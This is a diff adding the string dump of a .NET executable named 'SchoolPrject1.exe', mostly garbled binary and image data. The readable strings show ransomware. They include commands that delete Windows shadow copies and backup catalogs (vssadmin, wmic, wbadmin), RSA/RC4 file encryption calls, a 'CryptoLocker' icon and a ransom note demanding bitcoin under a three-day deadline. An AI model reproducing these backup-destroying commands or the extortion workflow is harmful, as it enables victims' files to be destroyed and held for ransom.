@@ -1,0 +1,695 @@
+!This program cannot be run in DOS mode.
+`.rsrc
+@.reloc
+VsH
+v4.0.30319
+#Strings
+IEnumerable`1
+SchoolPrject1
+SIZE_512
+SIZE_952
+SIZE_1024
+SHA256
+SIZE_2048
+get_UTF8
+SIZE_1369
+<Module>
+System.IO
+value__
+mscorlib
+System.Collections.Generic
+Thread
+add_Load
+Synchronized
+Append
+set_AutoScaleMode
+set_Image
+Enumerable
+IDisposable
+Double
+RuntimeTypeHandle
+GetTypeFromHandle
+set_BorderStyle
+set_FormBorderStyle
+get_ClassStyle
+set_ClassStyle
+FontStyle
+set_WindowStyle
+ProcessWindowStyle
+set_Name
+set_FileName
+get_NewLine
+set_Multiline
+System.Core
+ButtonBase
+ApplicationSettingsBase
+TextBoxBase
+Dispose
+Create
+EditorBrowsableState
+Delete
+get_White
+STAThreadAttribute
+CompilerGeneratedAttribute
+GuidAttribute
+GeneratedCodeAttribute
+DebuggerNonUserCodeAttribute
+DebuggableAttribute
+EditorBrowsableAttribute
+ComVisibleAttribute
+AssemblyTitleAttribute
+AssemblyTrademarkAttribute
+TargetFrameworkAttribute
+AssemblyFileVersionAttribute
+AssemblyConfigurationAttribute
+AssemblyDescriptionAttribute
+OrangeHeapAttribute
+CompilationRelaxationsAttribute
+AssemblyProductAttribute
+AssemblyCopyrightAttribute
+AssemblyCompanyAttribute
+RuntimeCompatibilityAttribute
+SchoolPrject1.exe
+set_Size
+set_AutoSize
+set_ClientSize
+ISupportInitialize
+System.Threading
+Encoding
+System.Runtime.Versioning
+FromXmlString
+ToXmlString
+ToString
+add_FormClosing
+System.Drawing
+ComputeHash
+get_Length
+GetLength
+get_Black
+add_Click
+System.ComponentModel
+user32.dll
+ContainerControl
+EnableMenuItem
+System
+AsymmetricAlgorithm
+HashAlgorithm
+Random
+set_TextAlign
+set_Icon
+MessageBoxIcon
+GetExtension
+Application
+set_Location
+System.Configuration
+System.Globalization
+System.Reflection
+ControlCollection
+set_StartPosition
+FormStartPosition
+Exception
+Button
+Intern
+CultureInfo
+set_StartInfo
+ProcessStartInfo
+Bitmap
+set_TabStop
+set_PersistKeyInCsp
+System.Linq
+set_ShowInTaskbar
+RSACryptoServiceProvider
+StringBuilder
+ComponentResourceManager
+FormClosingEventHandler
+System.CodeDom.Compiler
+IContainer
+set_ForeColor
+set_BackColor
+.cctor
+IntPtr
+System.Diagnostics
+System.Runtime.InteropServices
+System.Runtime.CompilerServices
+System.Resources
+.resources
+.resources
+DebuggingModes
+GetDirectories
+GetFiles
+ReadAllBytes
+WriteAllBytes
+GetBytes
+KeySizes
+FormClosingEventArgs
+get_Controls
+get_CreateParams
+System.Windows.Forms
+Contains
+set_AutoScaleDimensions
+MessageBoxButtons
+set_ScrollBars
+RichTextBoxScrollBars
+get_Chars
+SystemColors
+GetCurrentProcess
+set_Arguments
+Exists
+Concat
+GetObject
+set_MinWorkingSet
+op_Explicit
+EndInit
+BeginInit
+GraphicsUnit
+SetCompatibleTextRenderingDefault
+DialogResult
+ContentAlignment
+Environment
+set_Font
+Encrypt
+SuspendLayout
+ResumeLayout
+PerformLayout
+System.Text
+set_Text
+get_ActiveCaptionText
+GetSystemMenu
+set_TabIndex
+MessageBox
+PictureBox
+set_MinimizeBox
+set_MaximizeBox
+RichTextBox
+set_ImageKey
+System.Security.Cryptography
+get_Assembly
+set_ReadOnly
+Directory
+set_Opacity
+`b l!j"h#j$l%R&P'R(L)J*H+J,L-B.@/B0L1J2H3 4"5<6:788:9<:2;0<8=->'?8@"A<B$C.D
+33 ;!;"1#
+$k e!d"'#)$t%q&j'g(u)
+.U/p0 1
+J<K*L2M5N5O)PyQ7R9SvT,U;V&W XqY%Z<[+\?]l^;_+`'a-b+chdOeNf+g6h5i0jLk
+nXoUpPqVrUsWtFuQv
+wQx^y]z%{F|Y}X~[
+w{ q!l";#c$v%m&7'b(z)4*w+w,r-b.v/~0y1,2r3e4|5z6'7`8l9h:f;q</=
+!]"U#^$
+%W&C'^(P)F*
++T,X-\.J/]0
+1D2J3\4L5
+6E7C8@9J:
+;G<O=C>m?g@mAhB~C~D9EmFdG
+H{IsJ3K@LRM$N/OoPcQhR+SXTZUIV*W4X5Y0Z;[
+^ N!I"F#^$B%T&
+'](L)A*S+Y,o-j.x/x0;1|2p3t4r5e657c8z9f:y;
+<z=z>-?c@~AxB)C`DbEjFuG*H#I
+DS 3!>"m#p$~%{&j'}(7)u*z+z,g-s.r/d0/1{2~3,4i5s6)7m8j9g:l;h<-=
+"H#N$?%j&u'y(;)i*l+z,}-s.v/`031}2w304v5a6x7~8+9g:l;{<t=g>b?a@-A
+MQ Q!P"X#
+$j%n&='}(u)~*9+|,x-x.2/`031e2p3c4{5k6-7u8d9
+:{;(<s=o>h?a@"A
+!U"V#]$\%Z&T'
+(E)X*J+
+,]-M.R/G0L1F2S3
+5]6L7W8S9
+:y;w<q=y>h?:@nAqB{CzD5EvFvG2HtI~JlK|LtM|N
+OoPmQ(RaSiTwUaVuWgXsY
+qq p!`"h#`${%.&t'c(~)x*)+n,n-j.`/w0-1
+;n v!8"p#s$a%4&j'}(d)b*/+~,h-~.x/e0g1f2f3j4%5o6f7{8/9
+d2 e!
+"/#l$x%u&+'h(`)|*d+i,l-j.p/"0
+0c #!/"$#$L%X&_'^(S)O*]+S,
+-L.[/F0@1
+2@3J4\5^6C7E8D9H:D;
+<M=@>]?
+AQBLCzD
+EnFyG;HyIuJqKtL}M5N{O}P2QeRxSjT.UoVyW
+X~YfZf['\d]`^h_l`ua/b
+WrapNonExceptionThrows
+SchoolPrject1
+Copyright 
+  2021
+$730d5f64-bd57-47c1-9af4-d20aec714d02
+1.0.0.0
+.NETFramework,Version=v4.7.2
+FrameworkDisplayName
+.NET Framework 4.7.2A
+3System.Resources.Tools.StronglyTypedResourceBuilder
+16.0.0.0
+KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator
+11.0.0.0
+lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
+fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aBj
+QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
+System.Drawing.Icon
+IconData
+IconSize
+System.Drawing.Size
+System.Drawing.Size
+height
+gVHHw'
+;[B$]:
+}ufg#[
+^di92:
+OZdfH}
+m=h{--
+h4J98BG!^
+5EAP*I
+&rVE.ZP
+fv&J?{
+L0Y]&w
+6,@geow
+x&-xn|
+6d>9gk
+"rI@8NZ
+w4>1N9
+)uKJUi
+vnj*El
+k>NV!(
+,C/cla1
+cJc}ZC
+1~vM3=/
+4maM-s
+-?:I@2
+RJh4`v
+R;>.,&L
+E}{YX7
+i&bi|[
+Y~B"|b-
+K_M^8.
+1=Fo_#
+J9\uUH
+O_X7I/
+F4{+s#w
+P[iorOvT
+.0z1JP
+QHfnk:i['
+QrX&o..o
+5Ntd|K
+=mst8I
+/bmoL|
+!4BBsn
+9|_Q*Q
+dDu#Zv
+|'Fh&f
+Dc_F8=
+w296c\
+F0T0mx
+g.7-}4i
+-?IDAT
+#.x.g>5
++ifo{+
+[OwOwm
+b`1p4p8
+#\_\X 
+R6x03o|
+9jr)g^1
+e_>{>
+mDi]}?f
+QgR>.=s
+UJF!a%iY
+!l*&\Gd
+ayml3F
+yml3F[
+RH&LZZ
+6ZZRtG
+b!GL(gXE
+B?$>>
+ IwY!JwT
+CrU!Jw?
+3fOQ~
+<mk Jw+
+lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
+hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD
+QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
+System.Drawing.Bitmap
+V3.@3*o<6-F3
+gWs|Wt
+RXlZ`k
+N(&@//
+gUU?CAOW
+LcpbhxP@GOkt-^>
+Soxo?6b
+EZBqXgjHKOHW(
+4$+Cj[mSS@3;
+b468$/$
+{]GKm|
+5as{
+IDATx^
+}ym7[2.
+UVeK{k
+!B{bR[{$
+EEBly[~
+G1Z-3B%
+{]{mjM
+_6+</K
+`k]'RLs
+K`J}l$
+%>'O(q
+{=V:O|
+zBm;R(
+SQ)@&F
+R`/A&B
+UY*.K>
+Uobopnj
+r}^%#gZ
+U|@/S`&H
+VV4l(m
+yqg/Bk
+d9|7c[
+MyY+EZ
+Ww)=>A
+E[C*.|
+LJtJIImcBKk
+H%ZKJd
+rO<u1/
+.p!qEfh
+r2$\wY
+coZ82=
+4j*L+_
+Vj\onF
+kjL9&AJ/
+jd+GKP#e
+kdl{
+ER^)<Pz
+w@<[r)
+__CF(p
+STqJ{XV
+R{,nF}&
+S (L!f
+u&?X2M
+(uJs^G
+A4ND`KQs
+ZKzYBN
+fe&,{a
+w.@FG}
+W*R1J1
+^j)?RbQqLp
+"=9*@I)
+DGubIE
+R?*Cy$
+fDc#B3
+6H`$A6
+"D%%?tB
+!YH/eX
+JC~*,
+c$'?r|
+k1LNxTR\14
+Hw3ufQ5
+1^})0.=0
+3]f,~R
+Ai'wDx
+.wA~)B
+`?K` B
+2YM9yd
+M|9Jx/H
+CS`SV4
+pt)t-}
+-=ct>z
+z'@LhU
+zP>S"J-
+[+o>oM
+(/%(qRPg
+M<`pg2~3
+_<9@9:
+[T/Jq=
+HIH^hkI
+_'~0]!0
+:3}]_o
+7bx2?6
+0w$;u"
+m80MW54
+-@z8AiO
+?<(m'}
+FzoC65
+@%zX%H
+7duc:_f6
+^N7C?v)
+V*Dg*[
+q>O%@_>
+F7=tn>?
+fQ="C{
+r@Gvkd
+%G<&TW
+\iPuJG
+B`BaB`
+iP#47y
+hTOA]
+JTV %d0U
+@<CVw0
+D_f$ @
+h^?;U`N=a~
+zFN1@}N
+`V$.gc
+ 'hdEcZ6
+#_!03Jz
+of'0GL
+{,&k0
+a9K|f~
+Q!r-d/
+,Wn{(Iv
+H6o`LN
+t;$/q0
+WI>Jnq
+S_PYP*
+OMQ(\sT
+:I)*"G
+Z{O%@)
+%<JP3<
+Ski^C?
+dw S<H[
+,Y)P!'
+ U-R"?
+>MG!O&
+Px+eIm
+TXa.u%@I
+!.}zyVp
+Fuc-}3
+mp|9 Fhf
+=`LtkD
+7/@+p~
+A6m%.VC
+*7KPk
+qy;U^f
++R%<@~j
+V3jLmS
+R!p/@B`
+@Oh\66rQmV
+srH*!+
+fEv|Jd
+Y|*-K0+r
+AzENtH
+\A?)O%
+['&msYv
+yis_tFH+
+%3"X%0=
+$Y1bPmZ
+7oRR%l>
+DR%z;$
+4'ysh`
+XZ%SiI
+!}YrJzT
+3ULEe[
+;e0+8h
+=FCYI_7
+-KW~~*
+FWT?:br//=
+%0=^-!
+_epw`C<
+D.lQ;{
+B~ag`S
+`%WKd_
+_sHhd]
+Zb]}_|
+;wfxzv
+>7;1fa
++[*x%d
+oY53^BA
+ys'`l
+;b)OhEA
+w6eqs"
+U`SKWUG#
+V'c=p\
+svA9;K 
+O=4#H{
+J`b(zU
+c>Veqg
+&{@NEf
+nXaB=^
+:cuxi-
+A|$Ie
+s8,*}8
+&6-t;Q:
+9n^2y@s
+&,IDAT
+dM}$O%1
+VSq^Kv
+Ee$=']Xs
+9a\Lll
+%yzl%e,
+FiosCvf
+"z&%U9RF
+c~; c"
+:eb_= 
+.3K`JY
+x\&K`P.w
+QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
+System.Drawing.Bitmap
+IDATXG
+QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
+System.Drawing.Bitmap
+IDATx^
+!xir'<<T
+UGyvf+
+)+.bEp
+pf}YMg
+Bp@;Sr&
+Y]h}&o
+]=TYm}?
+hK?$/;
+RVOQU`
+w tv_m
+BuEM@w
+,I=2)tS
+Xk@dp6
+-Tf-BU
+r%eAO%
++]K]G]
+P4D\Hx
+4n/Qrg
+F8+W#q
+:!}}_b^
+ J9w]}
+^|uk7|y{/||c
+z!J~?I
+j#zS=i
+Ob)/}~
+2Wp4ZB
+TA}Fu1
+H->VpRb
+,&nG36}
+q0UkvN=k<
+]MQU"GaY
+'*JO k
+MAvt?dmnC
+X}5P~z/
+THkZ+%
+|~\|c|
+mPz2JS
+%[["qU3L
+k1qpmF
+B6rb>P
+MA7TU 
+|v~}7c
+=p|}w,z
+h`p9 Yd
+e``p9 id
+1gLSF'u
+i94E09
+_CorExeMain
+mscoree.dll
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <assemblyIdentity version="1.0.0.0" name="MyApplication.app"/>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
+    <security>
+      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
+        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
+abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/
+ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890
+.index
+.betarasite
+cmd.exe
+/C vssadmin.exe delete shadows /all /quiet
+/C wmic shadowcopy delete
+/C wbadmin delete catalog -quiet
+You can register at one of the website provided.
+You will be able to buy bictoins on your user panel.
+https://coinbase.com
+https://localbictoins.com
+https://bitpanda.com
+Buy bictoins
+Invalide Key! Please Try Again.
+Closing the decryptor will not help you to decrypt your files.
+MS PGothic
+(aucun)
+button1
+DECRYPT
+pictureBox1
+Microsoft YaHei UI
+label1
+All your files are encrypted
+richTextBox1
+label2
+Your documents, photos, databases and other files have been encrypted using RC4 and RSA-2048
+label3
+It means that its impossible to recover yocrypted files without our help. 
+label4
+If you want to decrypt your files, please contact us by email.
+label5
+You must provide your personnal ID in the subject of your message.
+label6
+You don't have all the time so hurry up and don't waste your time!
+label7
+If the allowed time is up without making the payment, your files will be encrypted forever
+label8
+YOUR PERSONNAL ID:
+label9
+You need your personnal key to decrypt your files.
+label10
+You need to pay 0.0060 BICTOINS to get your personnal key.
+label11
+Click here if you don't know how to buy bitcoins 
+button2
+HOW TO BUY BITCOINS?
+label12
+If you already made the payement and received your personnal key, please click on the button below.
+label14
+3 Days
+label13
+Your key will be destroyed in:
+pictureBox2
+panel1
+button3
+CHECK KEY
+button4
+textBox1
+$this.Icon
+CryptoLocker
+SchoolPrject1.Properties.Resources
+1oitevwu69h21
+key-icon
+$this.Icon
+1oitevwu69h21
+key-icon
+VS_VERSION_INFO
+VarFileInfo
+Translation
+StringFileInfo
+000004b0
+Comments
+CompanyName
+FileDescription
+SchoolPrject1
+FileVersion
+1.0.0.0
+InternalName
+SchoolPrject1.exe
+LegalCopyright
+Copyright 
+  2021
+LegalTrademarks
+OriginalFilename
+SchoolPrject1.exe
+ProductName
+SchoolPrject1
+ProductVersion
+1.0.0.0
+Assembly Version
+1.0.0.0
